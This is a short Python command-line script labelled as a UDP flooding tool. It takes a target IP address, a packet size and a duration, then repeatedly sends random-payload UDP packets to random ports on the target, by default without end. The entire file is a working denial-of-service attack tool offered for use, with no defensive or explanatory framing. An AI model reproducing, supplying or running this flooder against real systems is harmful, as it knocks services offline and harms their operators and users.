#!/usr/bin/python
# UDP Flooding Script by Khanejo
 
import socket,random,sys,time
 
if len(sys.argv) != 4:
        print("Usage: %s <Target IP> <Packet Size (MAX 65500)> <Duration Time (0 = forever)>" % sys.argv[0])
        sys.exit(1)
 
qIP = sys.argv[1]
qPSize = int(sys.argv[2])
qDuration = int(sys.argv[3])
 
qClock = (lambda:0, time.clock)[qDuration > 0]
qDuration = (1, (qClock() + qDuration))[qDuration > 0]
 
qPacket = random._urandom(qPSize)
qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
print("[Starting UDP Flood on %s with %s bytes for %s seconds]" % (qIP, qPSize, qDuration or 'Infinite'))
 
while True:
        if (qClock() < qDuration):
                qPort = random.randint(1, 65535)
                qSocket.sendto(qPacket, (qIP, qPort))
        else:
                break
 
print("DONE!")
